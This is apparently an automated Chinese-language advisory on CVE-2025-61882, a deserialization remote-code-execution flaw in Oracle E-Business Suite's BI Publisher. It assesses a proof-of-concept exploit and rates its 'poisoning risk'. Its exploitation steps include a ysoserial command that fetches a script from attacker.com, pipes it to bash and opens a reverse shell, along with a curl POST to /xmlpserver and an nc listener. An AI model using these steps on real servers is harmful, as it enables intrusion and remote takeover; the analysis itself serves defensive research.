## CVE-2025-61882 - Oracle E-Business Suite (BI Publisher Integration 组件) 远程代码执行 (RCE) / 不安全反序列化

**漏洞编号:** CVE-2025-61882

**漏洞类型:** 远程代码执行 (RCE) / 不安全反序列化

**影响应用:** Oracle E-Business Suite (BI Publisher Integration 组件)

**危害等级:** 高危，未经身份验证的远程攻击者可通过构造恶意HTTP请求执行任意代码。

**CVSS评分:** 

**影响版本:** Oracle E-Business Suite 版本 12.2.3-12.2.14，以及 Oracle BI Publisher 版本 12.2.1.3.0, 12.2.1.4.0

**利用条件:** 远程未经身份验证的攻击者，通过网络访问并构造恶意HTTP请求即可利用。

**POC 可用性:** 6

**POC 类型:** 概念验证

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

Oracle E-Business Suite (EBS) 是一款广泛应用于企业级的综合性业务管理软件。近期，在Oracle EBS的BI Publisher Integration组件中被披露存在一个远程代码执行漏洞，编号为CVE-2025-61882。该漏洞允许未经身份验证的远程攻击者通过构造恶意的HTTP请求，在受影响的服务器上执行任意代码。具体而言，该漏洞源于BI Publisher Integration组件在处理用户提供的XML参数或反序列化不受信任数据时存在安全缺陷，可能导致SSRF、CRLF注入、认证绕过以及最终通过XSLT处理器等机制实现RCE。受影响的版本包括Oracle E-Business Suite 12.2.3至12.2.14，以及Oracle BI Publisher 12.2.1.3.0和12.2.1.4.0。这是一个高度危险的漏洞，因为其利用条件低、影响范围广，且无需用户交互和身份验证。

**POC有效性分析**
所提供的POC代码包含两个文件：`exploit.java`和`exploit.sh`，它们共同展示了该漏洞的利用机制。`exploit.java`是核心的Java程序，其目的是生成并发送一个基于Java反序列化的Payload。代码中明确地指出了利用`CommonsBeanutils1`这个`ysoserial`库中的gadget来构造恶意对象，并通过`ObjectOutputStream`将其序列化。然后，这个序列化的数据被设计通过`Socket`连接发送到目标服务器的`9704`端口。值得注意的是，`generatePayload`函数被标记为占位符，这意味着攻击者需要手动或通过集成`ysoserial`库来生成实际的Payload。`exploit.sh`脚本则提供了一个使用`curl`命令发送已序列化Payload的示例，它假定Payload已经存在于`payload.ser`文件中，并通过HTTP POST请求将其发送到目标BI Publisher的`/xmlpserver`路径，并指定`Content-Type: application/java-serialized-object`头。
从POC的结构和逻辑来看，它清晰地描绘了不安全反序列化漏洞的典型利用流程。虽然不是一个“开箱即用”的完整自动化工具（因为它依赖`ysoserial`来生成实际的恶意对象并需要预先生成`payload.ser`），但它提供了充分的概念验证和关键技术细节。攻击者可以根据此POC的指导，结合`ysoserial`等工具，轻松构建出可用的漏洞利用程序。因此，该POC在概念上是高度有效的，能够准确地证明漏洞的存在及其可利用性，为后续的漏洞复现和防御措施的制定提供了宝贵参考。

**利用步骤**
1.  **环境准备**: 确认目标Oracle E-Business Suite服务器的BI Publisher Integration组件版本是否在受影响范围内（12.2.3-12.2.14，特别是BI Publisher 12.2.1.3.0或12.2.1.4.0）。
2.  **Payload生成**: 使用`ysoserial`工具（例如，`java -jar ysoserial.jar CommonsBeanutils1 "curl http://attacker.com/shell.sh | bash" > payload.ser`），生成一个恶意的Java序列化对象，其中包含攻击者希望在目标服务器上执行的系统命令。此处的命令示例是下载并执行一个远程脚本以获取反弹shell。
3.  **Payload发送**: 参考POC中的`exploit.sh`或`exploit.java`，构造一个HTTP POST请求。
    *   使用`exploit.java`的思路：编译并运行Java代码，将其连接到目标服务器的BI Publisher Integration组件的监听端口（例如9704），将生成的序列化Payload通过`ObjectOutputStream`写入到Socket中发送。
    *   使用`exploit.sh`的思路：将生成的`payload.ser`文件作为POST请求的`--data-binary`内容，通过`curl`发送至目标服务器的BI Publisher集成组件的`/xmlpserver`路径（例如`http://192.168.1.100:9704/xmlpserver`），并设置`Content-Type: application/java-serialized-object`头。
4.  **接收反弹Shell**: 在`attacker.com`（攻击者控制的服务器）上设置一个Web服务器来托管`shell.sh`，并设置一个监听器（如`nc -lvnp <port>`）来接收反弹shell连接。一旦Payload成功执行，目标服务器将尝试下载并运行`shell.sh`，进而建立反弹shell连接，使攻击者获得目标系统的命令执行权限。

**投毒风险分析**
对提供的POC代码进行深入分析后，可以判定其投毒风险为低，具体评定为10%。此评估基于以下几个关键因素：
1.  **代码透明度与可读性**: 提供的`exploit.java`和`exploit.sh`代码均结构清晰、逻辑明确，使用了标准的Java库（如`java.io.ObjectOutputStream`, `java.net.Socket`）和常见的Shell命令（如`curl`, `echo`）。代码中没有任何形式的混淆、加密或难以理解的复杂逻辑，使得安全研究人员可以轻松审计其功能。
2.  **恶意行为的明确性**: POC代码中明确展示了攻击Payload的意图，例如`exploit.java`中的`String cmd = "curl http://attacker.com/shell.sh | bash";`这行代码。这是一个典型的用于获取反弹shell的命令。这种命令是漏洞利用本身的核心组成部分，目的是演示RCE的能力，而不是POC代码作者在POC中隐藏的额外恶意行为。同样，`exploit.sh`中模拟发送恶意序列化数据也是为了演示攻击流程。这些行为是公开的、可预期的攻击载荷，而非隐藏的“投毒”代码。
3.  **无额外外部依赖或可疑连接**: 除了利用`ysoserial`（一个众所周知的合法安全工具）生成Payload之外，POC代码本身没有引入其他未知的第三方库或模块。`exploit.java`连接的目标是“oracle-server”，`exploit.sh`连接的目标是“192.168.1.100:9704”，这些都是为了演示攻击而设置的假定目标。代码中没有发现任何在后台连接到未声明的外部服务器、下载未知文件、修改系统配置或执行其他未经授权操作的行为。
4.  **符合安全研究标准**: 该POC的编写方式符合防御性安全研究的良好实践，即清晰地演示漏洞原理和利用方法，而不包含任何隐蔽的恶意意图。它旨在帮助组织理解漏洞的运作方式，从而加强防御，而不是作为传播恶意软件的载体。
因此，尽管POC本身是一个攻击工具，但其代码本身的安全性很高，不含额外的投毒风险。用户在使用时，主要风险在于未能正确配置目标地址或在生产环境中误操作，导致真实系统的损害，而非POC代码自带恶意功能。安全团队可以信任此POC来分析漏洞、开发检测规则和测试补丁效果。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/cve-2025-61882
